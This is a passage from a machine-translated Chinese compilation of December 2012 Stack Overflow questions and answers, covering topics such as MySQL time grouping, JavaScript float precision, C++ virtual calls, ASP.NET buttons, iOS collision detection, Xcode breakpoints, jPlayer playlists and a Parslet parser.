    // mutex is unlocked when 'lock' goes out of scope
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-10T17:59:41.777

你的描述不正确。互斥锁不能被锁定两次。你有一个不同的问题。

*   在互斥锁被锁定时检查重入。
*   检查异常

避免出现您应该使用的异常问题`boost::mutex::scoped_lock`( [RAAI](http://en.wikipedia.org/wiki/Resource_Acquisition_Is_Initialization) )

# mysql - mysql 按早上下午和晚上分组

> ID：13806187
> 
> 赞同：3
> 
> 时间：2012-12-10T17:40:03.353
> 
> 标签：mysql, datetime

我正在尝试从表中获取日志数据。我选择一个时间跨度（“maandag”到“vrijdag”）。这得到了我想要的结果，但现在我得到的问题是每天只显示 3 次测量。

第一个是 8 点之后的第一个 第二个是 14:00 点之后的第一个 第三个是 20:00 点之后的第一个

我遇到的问题是测量的时间不是恒定的。所以使用正则表达式来选择一天中的一部分是行不通的。通过下面的查询，我有时每天也会得到 2 个或 4 个甚至更多的结果。这是因为测量之间的时间基本上是 2 小时，但这不是恒定的，因此第二天的测量也是在同一时间进行的。

可以按一天的一部分分组吗？或者还有什么其他的解决方案？

```
data:
id datumTijd ph tbc temperatuur vbc gbc
1 2012-10-03 14:59:19 7.30.08 24.91 0.02 0     
1 2012-10-03 16:47:38 7.33.07 22.15 0.12 0
3 2012-10-03 17:03:06 7.31.09 23.23 0.05 0

query:
SELECT N.name, D.datumTijd, ROUND(D.gbc,2), ROUND(D.vbc,2), ROUND(D.tbc,2),ROUND(D.ph,2), ROUND(D.temperatuur,1)  
FROM METING.Name N, METING.Data D 
Where D.datumTijd BETWEEN "'+maandag+' 00:00:00" AND "'+vrijdag+' 23:59:59"  
AND N.id = D.id AND D.datumTijd 
AND D.datumTijd REGEXP "0[78]:..:..|1[34]:..:..|2[12]:..:.."';
ORDER BY N.name, D.datumTijd 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-10T17:55:19.007

你可以做这样的事情来将结果分组到 3 个不同的时期。然后，您可以在度量上使用聚合函数（SUM、MIN、MAX）。

```
SELECT   DATE(D.datumTijd),
         CASE WHEN TIME(D.datumTijd) BETWEEN '08:00:00' AND '14:00:00' THEN 1
              WHEN TIME(D.datumTijd) BETWEEN '14:00:00' AND '20:00:00' THEN 2
              WHEN TIME(D.datumTijd) BETWEEN '20:00:00' AND '24:00:00' THEN 3
         END as period
...
GROUP BY DATE(D.datumTijd),
         CASE WHEN TIME(D.datumTijd) BETWEEN '08:00:00' AND '14:00:00' THEN 1
              WHEN TIME(D.datumTijd) BETWEEN '14:00:00' AND '20:00:00' THEN 2
              WHEN TIME(D.datumTijd) BETWEEN '20:00:00' AND '24:00:00' THEN 3
         END 
```

# javascript - Javascript乘法精度

> ID：13806189
> 
> 赞同：0
> 
> 时间：2012-12-10T17:40:05.210
> 
> 标签：javascript

> **可能的重复：**
> [JavaScript 的浮点数学被破坏了吗？](https://stackoverflow.com/questions/588004/is-javascripts-floating-point-math-broken)

出于某种原因，当我将数字相乘时，当数字大于 10,000,000 时，我开始看到准确性问题。这是代码：

```
this.multiply = function(quantity, value, id) {
    var math = quantity * value;
    document.getElementById(id).value = math.toFixed(2);
} 
```

这是我得到的值：

```
11111     -> 11111.00
111111    -> 111111.00
1111111   -> 1111111.04
11111111  -> 11111110.45
111111111 -> 111111116.41 
```

从那里开始变得更糟。知道什么可能导致此问题或如何解决此准确性问题吗？

# c++ - 在当前类的构造函数中调用其他类中定义的虚函数

> ID：13806193
> 
> 赞同：4
> 
> 时间：2012-12-10T17:40:10.023
> 
> 标签：c++

```
class A
{
public:
    ...
    virtual bool Function(..) const {...}
}

class B : public A
{
public:
    ...
    virtual bool Function(..) const {...}
}

class OtherClass
{
public:
    OtherClass(A& a)
    {
        m_bool = a.Function(..);
    }
private:
    bool m_bool;
} 
```

假设类 A 或类 B 在构造类 OtherClass 之前已完全初始化。

Question> OtherClass的构造函数调用虚函数有问题吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-10T17:42:26.120

不，为什么会有任何问题？`A`传递（通过引用）到构造函数的实例`OtherClass`已经完全初始化，因此其上的虚函数按预期工作。

您听到的警告是关于在其构造函数中调用您正在构造的对象的虚函数；在这种情况下，虚拟调度被禁用，即在每个基类的构造函数中，调用的虚函数版本是其构造函数正在运行的基类之一。

这个想法是，在基类构造函数中，对象还没有成为它的最终类型；换句话说，当您构造一个从某个基类继承的对象时，它从“基本”类型开始，并在每个派生类构造函数运行时转换为派生类型。这反映了各种构造函数在运行时看到的虚函数版本。

[您可以在此处](https://stackoverflow.com/questions/962132/calling-virtual-functions-inside-constructors)更详细地了解它。

同样，这不会影响*传递*给构造函数的任何对象，因为它们已经完全构造，因此它们的“确定类型”（以及相应的虚函数集）已经完全建立。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T17:42:42.653

如果函数是定义的而不是纯虚函数或抽象基类，则函数调用应该没问题。该`a`对象将按预期调用其虚函数，因此要回答您的问题，**否**。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T20:40:13.823

调用A/B的虚函数与是从OtherClass的构造函数调用还是从其他任何地方调用都没有关系。所以没有问题。

# c# - 如何使用额外按钮更改多个按钮的背景颜色

> ID：13806197
> 
> 赞同：1
> 
> 时间：2012-12-10T17:40:25.403
> 
> 标签：c#, asp.net

我在页面上有很多按钮。每个按钮都有白色作为背景色，当我点击按钮时，它的颜色变为黄色。

```
protected void Button1_Click(object sender, EventArgs e)
{
    if(((Button)sender).BackColor != Color.Red)
    {((Button)sender).BackColor = Color.Yellow;}
} 
```

通过一个额外的按钮，我想将黄色的背景色更改为红色。这该怎么做？我知道可以这样做：

```
protected void Button7_Click(object sender, EventArgs e)
{
    if (Button1.BackColor == Color.Yellow)
    { Button1.BackColor = Color.Red; }
    if (Button2.BackColor == Color.Yellow)
    { Button2.BackColor = Color.Red; }          
} 
```

但我需要一种更快的方法，所以我不必专门为每个按钮编写

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T17:51:43.310

// 占位符的名称。在这种情况下，所有控件都在，`<form id="form1" runat="server" />`所以我放了`form1.Controls`.

```
foreach (var item in form1.Controls)
        {
            if (item is Button)
            {
                if (((Button)item).BackColor == Color.Red)
                {
                    ((Button)item).BackColor = Color.Yellow;
                }
            }
        } 
```

LINQ 查询可以写成

```
 foreach (Button item in form1.Controls.OfType<Button>().Where(item => (item).BackColor == Color.Red))
        {
            (item).BackColor = Color.Yellow;
        } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T17:49:28.317

抱歉编辑。将所有按钮放在 PlaceHolder 中。您可以在 PageLoad 调用此代码。

```
 foreach (Control item in PlaceHolder1.Controls)
    {
        if(item.GetType()== typeof(Button))
        {
            Button btn = (Button)item;
            btn.Click += new EventHandler(FunctionName);
        }

    }

protected void FunctionName(object sender, EventArgs e)
{
    //You code here to change colors
    Response.Write("Hello World");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T17:52:24.100

```
 protected void Button1_Click(object sender, EventArgs e)
    {
        if(((Button)sender).BackColor != Color.Red)
        {((Button)sender).BackColor = Color.Yellow;}
    }

    protected void button7_Click(object sender, EventArgs e)
    {
        foreach (var control in this.Controls)
        {
            if (control is Button && (Button)sender != control && ((Button)control).BackColor == Color.Yellow)
            {
                ((Button)control).BackColor = Color.Red;
            }
        }
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T23:31:45.047

这是一个 Javascript 答案，以防您想避免 PostBack：

```
<head runat="server">
    <title></title>
    <script language="javascript" type="text/javascript">
        function changeColor() {

            var items = document.getElementById("buttons").getElementsByTagName("input");

            for (var i = 0; i < items.length; i++) {
                if (items[i].style.background == "red")
                    items[i].style.background = "yellow";
                else
                    items[i].style.background = "red";
            }
            return false;
        }
    </script>
</head>
<body>
    <form id="form1" runat="server">
    <div id="buttons">
        <asp:Button ID="Button1" runat="server" Text="Button" BackColor="Red" />
        <asp:Button ID="Button2" runat="server" Text="Button" BackColor="Red" />
        <asp:Button ID="Button3" runat="server" Text="Button" BackColor="Red" />
        <asp:Button ID="Button4" runat="server" Text="Button" BackColor="Red" />
        <asp:Button ID="Button5" runat="server" Text="Button" BackColor="Red" />
        <asp:Button ID="Button6" runat="server" Text="Click Me" BackColor="Red" OnClientClick="return changeColor()" />
    </div>
    </form>
</body>
</html> 
```

祝你好运！

# ios - 如何检查 UIImageView 是否与任何其他视图发生冲突？

> ID：13806198
> 
> 赞同：2
> 
> 时间：2012-12-10T17:40:25.717
> 
> 标签：ios, ios4

我有一个 UIImageView 和一些 UIImageView 在一段时间后进入屏幕。我想检查一个 ImageView 是否与其他任何碰撞。

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T19:18:35.510

检测矩形视图之间碰撞的一般过程是用来[`CGRectIntersectsRect()`](https://developer.apple.com/library/ios/documentation/graphicsimaging/reference/CGGeometry/Reference/reference.html#//apple_ref/c/func/CGRectIntersectsRect)查看两个视图的框架是否相交。因此，如果您有一个`NSMutableArray`对象`UIImageView`，您可以通过它们执行快速枚举并查找碰撞，例如：

```
for (UIView* view in self.imageViewsArray)
{
    if (CGRectIntersectsRect(view.frame, viewToDetectCollisionWith.frame))
    {
        // do whatever you want when you detect the collision
    }
} 
```

或者，您可以使用`enumerateObjectsUsingBlock`which 使用快速枚举，但在单个语句中为您提供数字索引`idx`和数组中的各个对象：`UIView`

```
[self.imageViewsArray enumerateObjectsUsingBlock:^(UIView *view, NSUInteger idx, BOOL *stop) {
    if (CGRectIntersectsRect(view.frame, viewToDetectCollisionWith.frame))
    {
        // do whatever you want when you detect the collision
    }
}]; 
```

* * *

**原答案：**

如果您`UIImageView`通过各种自动动画技术为对象设置动画，则必须使用诸如[`CADisplayLink`](http://developer.apple.com/library/ios/#documentation/QuartzCore/Reference/CADisplayLink_ClassRef/Reference/Reference.html)检查碰撞之类的东西，因为 iOS 正在处理动画，否则您不会被告知`frame`动画中间的各种视图. 每次动画进行时都会通知您的`CADisplayLink`应用程序，因此您可以在动画进行时获得有关视图位置的信息。听起来您没有利用内置动画技术，而是使用 a`NSTimer`手动调整帧，因此您可能不需要以下代码。但是，如果您曾经追求更自动化的动画，则可以使用以下技术。

您可以做的是[`CADisplayLink`](http://developer.apple.com/library/ios/#documentation/QuartzCore/Reference/CADisplayLink_ClassRef/Reference/Reference.html)在动画进行时使用 a 获取有关屏幕的信息：

```
#import <QuartzCore/QuartzCore.h>

CADisplayLink *displayLink = [CADisplayLink displayLinkWithTarget:self selector:@selector(displayLinkHandler)];
[displayLink addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSDefaultRunLoopMode]; 
```

您甚至可能希望将其存储在类属性中，以便在视图出现和消失时添加和删除它：

```
- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];

    self.displayLink = [CADisplayLink displayLinkWithTarget:self selector:@selector(displayLinkHandler)];
    [self.displayLink addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSDefaultRunLoopMode];
}

- (void)viewWillDisappear:(BOOL)animated
{
    [super viewWillDisappear:animated];

    [self.displayLink removeFromRunLoop:[NSRunLoop mainRunLoop] forMode:NSDefaultRunLoopMode];
    self.displayLink = nil;
} 
```

然后，你可以开始你的动画了。我只是使用标准的基于块的动画来不断地为两个图像视图帧的变化设置动画，但显然你会做任何适合你的应用程序的事情：

```
[UIView animateWithDuration:4.0
                      delay:0.5
                    options:UIViewAnimationOptionAutoreverse | UIViewAnimationOptionRepeat
                 animations:^{
                     self.imageView1.frame = ... // I set the frame here
                     self.imageView2.frame = ... // I set the frame here
                 }
                 completion:nil]; 
```

现在我可以检测到这两个帧何时与此处理程序发生碰撞（即它们的帧是否相交），该`CADisplayLink`处理程序获取相关[`presentationLayer`](https://developer.apple.com/library/ios/documentation/graphicsimaging/reference/CALayer_class/Introduction/Introduction.html#//apple_ref/occ/instm/CALayer/presentationLayer)属性以获取“进行中”的帧坐标：

```
- (void)displayLinkHandler
{
    id presentationLayer1 = self.imageView1.layer.presentationLayer;
    id presentationLayer2 = self.imageView2.layer.presentationLayer;

    BOOL nowIntersecting = CGRectIntersectsRect([presentationLayer1 frame], [presentationLayer2 frame]);

    // I'll keep track of whether the two views were intersected in a class property,
    // and therefore only display a message if the intersected state changes.

    if (nowIntersecting != self.wasIntersected)
    {
        if (nowIntersecting)
            NSLog(@"imageviews now intersecting");
        else
            NSLog(@"imageviews no longer intersecting");

        self.wasIntersected = nowIntersecting;
    }
} 
```

顺便说一句，您可能需要将 Quartz 2D 添加`QuartzCore.framework`到您的项目中。请参阅[项目编辑器帮助](http://developer.apple.com/library/ios/#recipes/xcode_help-project_editor/Articles/AddingaLibrarytoaTarget.html)。

# java - 线程“主”java.lang.UnsatisfiedLinkError 中的异常：java.library.path 中没有 jpcap

> ID：13806199
> 
> 赞同：6
> 
> 时间：2012-12-10T17:40:28.307
> 
> 标签：java, netbeans, jpcap

我正在使用 netbeans ide 并尝试使用 jpcap 库捕获数据包。我的程序以前可以正常运行，突然出现这个错误

```
Exception in thread "main" java.lang.UnsatisfiedLinkError: no jpcap in java.library.path 
```

正在出现。我也在我的另一台电脑上尝试过 ds 但徒劳无功.. 我添加了 jpcap 库，在安装之前我完全清除了旧版本。已经做了所有可用的事情。我遇到了严重的麻烦

请帮忙！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-10T22:50:28.790

将此添加到程序的开头：

`System.out.println(System.getProperty("java.library.path"));`

你应该得到一个目录列表。您`jpcap`的`DLL`（或`so`在 UNIX 上）必须位于这些目录之一中，您的程序才能正常工作。如果它不存在，那么：

*   将包含该`DLL`/的目录添加`so`到您的系统`PATH`（首选）。
*   将`DLL`/添加`so`到打印的目录之一中。

# objective-c - 如何在 XCode 4 中特定类中特定属性的“objectAtIndex：”方法上设置断点？

> ID：13806200
> 
> 赞同：10
> 
> 时间：2012-12-10T17:40:30.983
> 
> 标签：objective-c, xcode, xcode4, breakpoints

我想在特定类中特定属性的“objectAtIndex：”方法上设置一个符号断点。

请参阅以下代码：

```
@interface Foo
...
@property (strong,nonatomic) NSMutableArray *fooArray;
...
@end 
```

我已经尝试过以下事情：

*   `-[[Foo fooArray] objectAtIndex:]`
*   `-[Foo::fooArray objectAtIndex:]`
*   `-[Foo::fooArray objectAtIndex]`
*   `Foo::fooArray::objectAtIndex:`
*   `Foo::fooArray::objectAtIndex`
*   `Foo::fooArray::objectAtIndex()`

这些解决方案都不起作用。

有什么想法可以解决问题吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T18:22:53.440

不幸的是，虽然这很有用，但由于多种原因，它无法工作。

第一个涉及如何指定方法。用于在断点中识别方法的方法签名包含三个部分：

```
-¹[NSDictionary² objectForKey:³]
+¹[NSString² stringWithContentsOfURL:encoding:error:³] 
```

1.  这是实例方法（-）还是类方法（+）？
2.  这个方法的哪个类的实现？
3.  这个方法的选择器是什么？

所以你的第一个问题是你为#2写的不是一个类。

您所拥有的是一个类，后跟一个属性名称以某种方式。这是行不通的，因为调试器无法知道这是否是纯访问器——它不能确定您或实现该属性的任何人没有编写自定义访问器来执行其他操作。这意味着调试器没有良好、可靠的方法来获取该值，或者知道该值何时更改，而不会产生潜在的副作用。

此外，类在方法签名中的作用是确定哪个类提供了您要设置断点的实现。当您开始尝试引用包含对象的属性时，它就会消失，因为调试器*需要*一个类，并且必须从对象中获取它 - 并参见上一段了解一些困难知道始终是哪个对象。

（公平地说，调试器确实有可能观察实例变量的值——IIRC，两个调试器都已经可以在观察点中执行此操作，尽管我上次尝试的观察点的可靠性是不稳定的。如果调试器可以将属性转换为其支持 ivar（如果有的话），并注意这一点，对于大多数属性来说，这将是一个不错的 90% 解决方案，这些属性不受富有想象力的存储实现和自定义访问器的支持。但调试器无法做到今天这个。）

第二个原因是 NSArray 是一个类簇。

您可能已经知道第一部分（我怀疑这就是您尝试通过另一个属性指定单个对象的原因）：

NSArray 和 NSMutableArray 都是抽象类，这反过来又意味着两者都没有实现做数组的业务；每个都实现了一堆方便的方法，同时留下一组未实现的核心方法，供子类实现。

所以，当你创建一个 NSArray 时，你并没有创建一个 NSArray。您返回的对象将是 NSArray 的某个私有子类的一个实例，它自己实现了它如何管理对象的有序列表的所有细节。

所以你可以在，比如说，设置一个断点`-[NSArray objectAtIndex:]`，但它永远不会被命中，因为没有使用 NSArray 的实现`objectAtIndex:`——使用那个实现是没有意义的，因为那个实现引发了一个异常（旨在捕获忘记实现的子类它）。

打破你的问题的部分是：

虽然 NSArray 的各种非必要方法的实现最终是根据核心方法定义的，例如`objectAtIndex:`，但这并不意味着子类必须使用这些实现。一个子类很可能有它自己的不使用的实现`objectAtIndex:`，如果`objectAtIndex:`不是最有效的方式来做他们所做的事情（例如，如果数组是由链表而不是 C 数组支持的）。

所以，总结一下这个长答案：

*   调试器不可能可靠地监视属性的值。
*   因此，当调用作为该属性值的对象的类中的方法时，调试器不可能中断，因为设置断点的正确方法可能随时更改，而调试器不能知道什么时候发生。
*   即使您可以中断`objectAtIndex:`某个由属性标识的对象，该数组也可能永远不会使用`objectAtIndex:`，在这种情况下，您的断点将永远不会被命中。

你可能应该问另一个问题，关于你试图做的任何事情`objectAtIndex:`。我假设您正在尝试调查应用程序中的错误；该错误可能是另一个有趣的问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-11T20:51:00.567

经过一番挖掘，我找到了解决这个问题的方法。这有点丑

它涉及在由第一个断点触发的命令中动态创建条件断点。

首先，只要你的 fooArray 准备好就中断。我选择了`fooArray`访问器，但可以更早完成：

`breakpoint set --name "-[Foo fooArray]"`

然后，你想要的是`objectAtIndex:`在这个特定的数组对象上调用时中断。首先让我们把它的指针放在一个变量中：

`expr id $watch = self->_fooArray`

然后在条件中使用此变量创建一个新断点：

`breakpoint set --name "-[__NSArrayI objectAtIndex:]" --condition "$rdi == $watch"`

*   `$rdi`包含`self`，至少在`x86_64`。`$r0`在 ARM 上使用。（请参阅克拉克考克斯[关于该主题的精彩帖子](http://www.clarkcox.com/blog/2009/02/04/inspecting-obj-c-parameters-in-gdb/)。）
*   `-[NSArray objectAtIndex:]`永远不会被调用。正如彼得所提到的， NSArray 是一个类集群，而您的数组实际上是一个`__NSArrayI`.

或者，在 Xcode 中：

![Xcode 动态断点](../Images/c57e6e65ae2c8ae6d79409cc86836d01.png)

（不要忘记选中“继续”框。）

这不是很漂亮，但它似乎工作！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T12:44:22.733

我不在我的 Mac 上，所以我不能自己尝试，但是如何：

```
breakpoint set -n "-[[Foo fooArray] objectAtIndex:]" 
```

# php - PHP 编码人员对 WHERE NOT IN 查询的替代建议

> ID：13806206
> 
> 赞同：0
> 
> 时间：2012-12-10T17:40:55.070
> 
> 标签：php, database, arrays, where

我正在尝试为一个站点构建一个简单的随机投票系统，目前，我错误地认为，我有以下设置

当用户进入网站的随机投票部分时，他会看到一个可投票的项目，首先，这是在最长时间 agp 上最后一次投票的项目，其次，不是用户之前投票的项目，第三是必须根据他们的相关主题列表与他们相关。作为旁注，如果用户跳过投票，它不能在列表中再次向他们显示相同的东西，并且必须记录所有单票以产生统计数据。

目前，我这样做的方式是在数据库中针对他们的帐户保存一个序列化数组，其中包含他们之前投票的投票项目 ID 编号列表。在这一点上我想说的是，我不宽恕这一点，将序列化数组插入数据库是愚蠢的，我为我的行为感到遗憾；）。

不过，我想不出另一种方法来做到这一点。此时，该数组是由添加到列表中的用户投票构建的。但是，如果我要继续并且有人可以投票支持多达 100 件事情，那么查询将变得非常庞大。此时我正在使用此查询来获取列表中的下一项：

```
//$finarr is the received unserialized list of values from the database

$sql = "SELECT * FROM vote_item_headers WHERE Id NOT IN (".$finarr.") ORDER BY LastVoted DESC LIMIT 1"

//execute query and display results 
```

我还应该注意到，在这一点上，我什至没有费心添加上面的第三个要求，因为坦率地说，当我不得不进行需要包含所有要求的查询时，我什至不知道从哪里开始或任何事情多于。

您可能会发现更多相关信息：我还有一些其他表格，如下所述。

core_users = 用户及其兴趣列表 core_interests = 所有兴趣列表 core_language = 项目可能属于的不同可能语言的列表 vote_item_headers = 所有可投票项目的列表，其中包含兴趣和语言表中的引用来定义可投票项目的额外属性。core_votes =人们投票的主列表

如果这对你们来说太模糊了，我真的很抱歉，我真正想要的只是在这种情况下处理大量需要组合以获得结果的信息时的指导。

欢迎任何建议。我很高兴重组整个事情只是为了让它正确。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:05:36.037

`voted`

```
user_id   | Id
----------+------
    1     | 12
    1     | 14
    1     | 187
    2     | 23

SELECT * FROM vote_item_headers 
    WHERE Id NOT IN (
        SELECT Id FROM voted WHERE user_id=1234
    ) 
    ORDER BY LastVoted DESC LIMIT 1 
```

但你也想要相关的帖子

`relevant_posts`

```
user_id   | Id
----------+------
    1     | 342
    1     | 253
    1     | 32
    2     | 53

SELECT vote_item_headers.* FROM vote_item_headers 
    # cut down the amount returned with relevant_posts table
    INNER JOIN relevant_posts ON (
        vote_item_headers.Id=relevant_posts.Id
        AND user_id=1234
    ) 
    WHERE vote_item_headers.Id NOT IN (
        SELECT Id FROM voted WHERE user_id=1234
    ) 
    ORDER BY LastVoted DESC LIMIT 1 
```

# html - JPlayer - 使用 Flash 后备的 MP3 播放列表支持

> ID：13806211
> 
> 赞同：0
> 
> 时间：2012-12-10T17:41:15.697
> 
> 标签：html, flash, firefox, mp3, jplayer

我是 JPlayer 的新手，并不知道如何使用它。我正在尝试创建一个仅使用 MP3 文件的播放器，我知道并非每个浏览器都本机支持 MP3 播放，因此要让播放器正常工作，在某些情况下需要使用 Flash 后备。

目前我可以让播放器与单个 MP3 一起工作，但是当添加多个 MP3 时，只会播放第一首曲目。

**这是我当前的脚本**

```
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Player</title>
<script type='text/javascript' src='http://code.jquery.com/jquery-1.6.4.js'></script>
<script type='text/javascript' src="http://www.jplayer.org/latest/js/jquery.jplayer.min.js"></script>
<script type="text/javascript" src="js/jplayer.playlist.min.js"></script>
<script type='text/javascript'>//<![CDATA[ 
$(function(){
$("#jquery_jplayer").jPlayer({
    ready: function () {
      $(this).jPlayer("setMedia", { mp3: "http://www.jplayer.org/audio/mp3/TSP-01-Cro_magnon_man.mp3" }, 
      { mp3: "http://www.jplayer.org/audio/mp3/TSP-05-Your_face.mp3" });
    },
    swfPath: "http://www.jplayer.org/latest/js/Jplayer.swf",
    supplied: "mp3",
    volume: 1,
    wmode:"window",
    solution: "html,flash",
    errorAlerts: true,
    warningAlerts: false

});
});//]]>  
</script>
</head>
<body>
<div id="jquery_jplayer"></div>
<div id="jp_container_1" class="jp-audio">
    <div class="jp-type-single">
      <div id="jp_interface_1" class="jp-interface all_rounded_corners">
        <ul class="jp-controls">
          <li><a href="#" class="jp-play pp" tabindex="1">play</a></li>
          <li><a href="#" class="jp-pause pp" tabindex="1">pause</a></li>
          <li><a href="#" class="jp-previous" tabindex="1">Previous</a></li>
          <li><a href="#" class="jp-next" tabindex="1">Next</a></li>
        </ul>
        <div class="jp-progress">
          <div class="jp-seek-bar">
            <div class="jp-play-bar"></div>
          </div>
        </div>
      </div>
    </div>
</div>
</body>
</html> 
```

我可以说我在某个地方出错了，但我不知道在哪里，我希望得到你的帮助。随意修改脚本以使其工作，并可能将我引导到它工作的示例。

感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T08:44:17.523

您需要使用 jPlayerPlaylist 而不是 jPlyer，需要执行以下操作

```
 <!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Player</title>
<script type='text/javascript' src='http://code.jquery.com/jquery-1.6.4.js'></script>
<script type='text/javascript' src="http://www.jplayer.org/latest/js/jquery.jplayer.min.js"></script>
<script type="text/javascript" src="js/jplayer.playlist.min.js"></script>

</head>
<body>
<div id="jquery_jplayer"></div>
<div id="jp_container_1" class="jp-audio">
    <div class="jp-type-single">
      <div id="jp_interface_1" class="jp-interface all_rounded_corners">
        <ul class="jp-controls">
          <li><a href="#" class="jp-play pp" tabindex="1">play</a></li>
          <li><a href="#" class="jp-pause pp" tabindex="1">pause</a></li>
          <li><a href="#" class="jp-previous" tabindex="1">Previous</a></li>
          <li><a href="#" class="jp-next" tabindex="1">Next</a></li>
        </ul>
        <div class="jp-progress">
          <div class="jp-seek-bar">
            <div class="jp-play-bar"></div>
          </div>
        </div>
      </div>
    </div>
</div>
</body>
</html>

<script type='text/javascript'>//<![CDATA[ 

var myPlaylist = null;
 $(document).ready(function () {
 myPlaylist = new jPlayerPlaylist(
                        {
                            jPlayer: "#jquery_jplayer_N",
                            cssSelectorAncestor: "#jp_container_N"
                        },
                        [
                            {
                                mp3: "http://www.jplayer.org/audio/mp3/TSP-01-Cro_magnon_man.mp3",
                            }
                        ],
                        {
                            playlistOptions: {
                                enableRemoveControls: true
                            },

                            swfPath: "http://www.jplayer.org/latest/js/Jplayer.swf",
                            supplied: "mp3",
                            solution: "html,flash"

                        });

 myPlaylist.option("autoPlay", true);

myPlaylist.add({ title: "", artist: "", mp3: "http://www.jplayer.org/audio/mp3/TSP-05-Your_face.mp3", poster: "", });
});
</script> 
```

# android - 处理程序在长按时未收到消息

> ID：13806212
> 
> 赞同：1
> 
> 时间：2012-12-10T17:41:17.457
> 
> 标签：android

尝试通过从 GestureDetector 借用代码来实现长按，我得到了一个最小示例，当 onTouchEvent() 返回 true 时，它​​不会在 GestureHandler 中接收消息。返回 false 时，确实会传递消息，但事件处理结束并且长按不会被取消。

有没有办法让这个代码与 onTouchEvent() 返回 true 一起工作？

```
public class OverlayView extends View  {
    private static final int LONG_PRESS = 1;
    private Handler handler;
    private static final String TAG = OverlayView.class.getName();
    private class GestureHandler extends Handler {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case LONG_PRESS:
                dispatchLongPress();
                break;

            default:
                throw new RuntimeException("Unknown message " + msg);
            }
        }
    }

    public OverlayView(Context context, AttributeSet attrs) {
        super(context, attrs);
        handler = new GestureHandler();
    }

    private void dispatchLongPress() {
        Toast.makeText(getContext(), "Long Press", Toast.LENGTH_SHORT).show();
    }

    @Override
    public boolean onTouchEvent(MotionEvent e) {
        Log.d(TAG, e.toString());
        switch (e.getAction()) {
        case MotionEvent.ACTION_DOWN:
            handler.removeMessages(LONG_PRESS);          
            handler.sendEmptyMessageAtTime(LONG_PRESS, e.getDownTime() + 1000);
            break;
        case MotionEvent.ACTION_MOVE:
            handler.removeMessages(LONG_PRESS);
            break;
        case MotionEvent.ACTION_UP:
            handler.removeMessages(LONG_PRESS);
            break;
        default:
            break;
        }

        return true;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:00:19.203

即使您的手非常稳定，您也可能会创建一个`ACTION_MOVE`事件：

```
case MotionEvent.ACTION_MOVE:
    handler.removeMessages(LONG_PRESS);
    break; 
```

您的手指只会移动几个像素，但这足以消除您的长按回调。

Android uses a couple static variables label `___SLOP` and calculates the distance between the first `ACTION_DOWN` event and the current event. Once the MotionEvent has traveled beyond the slop threshold, only then does it cancel the callback. I recommend using the same approach.

# php - 通过 SQL / PhpMyAdmin 在几篇文章中将 THIS（句子）替换为 THAT

> ID：13806219
> 
> 赞同：0
> 
> 时间：2012-12-10T17:41:43.530
> 
> 标签：php, mysql, sql, phpmyadmin

我已经使用这个 sql 代码为数百篇文章添加了签名：

```
UPDATE xxx_content 
SET introtext = CONCAT(introtext, '<br/>signature blabla<br/>') 
WHERE catid IN (778, 779, 780); 
```

我想知道是否有一种方法可以使用与“查找 THIS 并替换为 THAT”相同的功能来频繁更新我的签名。

PS：在内容的任何地方都可以使用的技巧（不仅在底部）将非常完美！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T17:48:15.143

我认为你可以使用这样的东西：

```
UPDATE xxx_content 
SET introtext = replace(introtext, 'THIS', 'THAT')
WHERE catid IN (778, 779, 780) and introtext like '%THIS%' 
```

# ruby - Parslet Alternatives 不解析整个字符串

> ID：13806220
> 
> 赞同：2
> 
> 时间：2012-12-10T17:41:46.260
> 
> 标签：ruby, parslet

我有以下规格

```
 it "parses a document with only an expression" do
    puts parser.document.should parse("[b]Hello World[/b]")
  end
  it "parses a document with only text" do
    puts parser.document.should parse(" Hello World")
  end
  it "parses a document with both an expression and text" do
    puts parser.document.should parse("[b]Hello World[/b] Yes hello")
  end 
```

对于以下 Parslet 解析器

```
class Parser < Parslet::Parser

rule(:open_tag) do
  parslet = str('[')
  parslet = parslet >> (str(']').absent? >> match("[a-zA-Z]")).repeat(1).as(:open_tag_name)
  parslet = parslet >> str(']')
  parslet
end

rule(:close_tag) do
  parslet = str('[/')
  parslet = parslet >> (str(']').absent? >> match("[a-zA-Z]")).repeat(1).as(:close_tag_name)
  parslet = parslet >> str(']')
  parslet
end

rule(:text) { any.repeat(1).as(:text) }

rule(:expression) do
  # [b]Hello World[/b]
  # open tag, any text up until closing tag, closing tag
  open_tag.present?
  close_tag.present?
  parslet = open_tag >> match("[a-zA-Z\s?]").repeat(1).as(:enclosed_text) >> close_tag
  parslet
end

rule(:document) do
  expression | text
end 
```

前两个测试通过就好了，我可以通过`put`将它们输出到命令行来看到原子的类型是正确的。但是，当我尝试使用表达式和纯文本解析文档时，它无法解析纯文本，并出现以下错误

```
Parslet::UnconsumedInput: Don't know what to do with " Yes hello" at line 1 char 19. 
```

